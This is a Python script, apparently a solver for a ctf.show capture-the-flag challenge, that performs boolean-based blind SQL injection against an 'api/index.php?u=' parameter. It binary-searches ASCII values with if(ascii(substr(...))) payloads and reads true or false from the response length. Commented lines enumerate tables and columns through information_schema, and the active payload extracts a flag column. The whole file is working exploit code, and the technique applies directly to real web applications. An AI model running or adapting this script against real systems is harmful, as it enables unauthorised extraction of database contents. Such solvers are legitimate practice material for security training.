import requests
import time

url='http://c2841943-a96a-4dd6-9ca7-7485dc01062b.challenge.ctf.show/api/index.php?u='

flag=''
for i in range(1,100):
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break

        #payload=f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},username,id)"
        #payload=f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'),{i},1))<{j},username,id)"
        payload=f"if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),{i},1))<{j},username,id)"

        r=requests.get(url=url+payload).text
        #print(r.text)
        if len(r)<288:
            max=j
        else:
            min=j